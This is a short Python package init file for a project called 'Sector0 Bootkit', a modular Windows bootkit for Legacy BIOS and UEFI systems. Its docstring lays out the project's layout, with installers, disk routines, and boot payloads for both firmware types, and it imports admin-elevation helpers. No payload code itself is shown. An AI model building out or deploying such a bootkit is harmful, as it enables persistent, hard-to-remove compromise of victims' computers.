"""
Sector0 Bootkit
==================
A modular bootkit for Windows systems supporting both Legacy BIOS and UEFI.

Structure:
    config.py       - Configuration settings
    installer.py    - Main entry point
    core/
        utils.py    - Logging and utilities
        disk.py     - Disk operations
        legacy.py   - Legacy BIOS installer
        uefi.py     - UEFI installer
    payloads/
        bootloader.asm  - Legacy BIOS payload source
        bootloader.bin  - Compiled legacy payload
        BOOTX64.c       - UEFI payload source
        BOOTX64.efi     - Compiled UEFI payload
"""

from .config import UEFI, BIOS, INSTALLER
from .core import log, is_admin, request_admin
